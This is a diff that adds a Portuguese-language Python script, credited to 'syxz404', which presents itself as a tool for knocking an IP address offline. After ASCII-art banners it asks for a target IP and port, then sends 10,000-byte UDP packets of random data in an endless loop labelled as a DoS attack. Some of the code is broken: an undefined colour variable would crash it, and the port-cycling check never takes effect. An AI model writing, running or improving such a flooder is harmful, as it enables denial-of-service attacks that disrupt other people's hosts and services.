@@ -1,0 +1,57 @@
+import os
+import time
+import socket
+import random
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(10000)
+timeout = time.time()
+
+preto= '\033[37m'
+vermelho= '\033[34m'
+amarelo= '\033[31m'
+def script():
+    os.system("clear")
+    time.sleep(1)
+    print(preto+"⣿⣿⣿⣵⣿⣿⣿⠿⡟⣛⣧⣿⣯⣿⣝⡻⢿⣿⣿⣿⣿⣿⣿⣿")
+    print("⣿⣿⣿⣿⣿⠋⠁⣴⣶⣿⣿⣿⣿⣿⣿⣿⣦⣍⢿⣿⣿⣿⣿⣿ ")
+    print("⣿⣿⣿⣿⢷⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢼⣿⣿⣿⣿")
+    print("⢹⣿⣿⢻⠎⠔⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿")
+    print("⢸⣿⣿⠇⡶⠄⣿⣿⠿⠟⡛⠛⠻⣿⡿⠿⠿⣿⣗⢣⣿⣿⣿⣿")
+    print(vermelho+"⠐⣿⣿⡿⣷⣾⣿⣿⣿⣾⣶⣶⣶⣿⣁⣔⣤⣀⣼⢲⣿⣿⣿⣿")
+    print("⠄⣿⣿⣿⣿⣾⣟⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⢟⣾⣿⣿⣿⣿ ")
+    print("⠄⣟⣿⣿⣿⡷⣿⣿⣿⣿⣿⣮⣽⠛⢻⣽⣿⡇⣾⣿⣿⣿⣿⣿ ")
+    print("⠄⢻⣿⣿⣿⡷⠻⢻⡻⣯⣝⢿⣟⣛⣛⣛⠝⢻⣿⣿⣿⣿⣿⣿ ")
+    print("⠄⠸⣿⣿⡟⣹⣦⠄⠋⠻⢿⣶⣶⣶⡾⠃⡂⢾⣿⣿⣿⣿⣿⣿")
+    print(amarelo+"⠄⠄⠟⠋⠄⢻⣿⣧⣲⡀⡀⠄⠉⠱⣠⣾⡇⠄⠉⠛⢿⣿⣿⣿")
+    print("⠄⠄⠄⠄⠄⠈⣿⣿⣿⣷⣿⣿⢾⣾⣿⣿⣇⠄⠄⠄⠄⠄⠉⠉")
+    print("⠄⠄⠄⠄⠄⠄⠸⣿⣿⠟⠃⠄⠄⢈⣻⣿⣿⠄⠄⠄⠄⠄⠄⠄")
+    print("⠄⠄⠄⠄⠄⠄⠄⢿⣿⣾⣷⡄⠄⢾⣿⣿⣿⡄⠄⠄⠄⠄⠄⠄") 
+    print("⠄⠄⠄⠄⠄⠄⠄⠸⣿⣿⣿⠃⠄⠈⢿⣿⣿⠄⠄⠄⠄⠄⠄⠄")
+    time.sleep(1)
+    print("\n")
+    print (azul+"░█▀█░█░█░▀█▀░▀█▀░█▀█░░░▀█▀░█▀█")
+    print("░█▀▀░█░█░░█░░░█░░█░█░░░░█░░█▀▀")
+    print("░▀░░░▀▀▀░░▀░░▀▀▀░▀░▀░░░▀▀▀░▀░░")
+    time.sleep(1)
+    print("\n")
+    print(vermelho+"Criado por "+amarelo+"syxz404")
+    time.sleep(1)
+    print(vermelho+"Bem vindo ao script de derrubar Ip!")
+    print("\n")
+    ip = input("Digite o endereço de ip: "+amarelo)
+    port = int(input("Digite a porta: "+amarelo))
+    time.sleep(1)
+    print(vermelho+"Para parar o ataque, aperte"+amarelo+" ctrl+c")
+    print("Ataque iniciado...")
+    while True:
+           while 1:
+                 if time.time() > timeout:
+                      break
+                 else:
+                         pass
+           sock.sendto(bytes, (ip, port))
+           print (" [ ? ] ATTACKING SEND DOS BY: SYXZ404 ")
+           if port == 65500:
+            port = 1
+script()
